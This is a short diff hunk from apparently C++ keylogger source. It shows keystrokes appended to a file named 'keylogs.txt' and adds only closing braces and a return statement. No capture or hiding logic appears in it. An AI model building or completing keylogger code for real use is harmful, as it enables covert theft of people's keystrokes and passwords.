@@ -55,3 +55,9 @@ int main(){
                     logfile.open("keylogs.txt", fstream::app);
 					logfile << key;
                     logfile.close();
+					 }
+            }
+        }
+    }
+    return 0;
+}
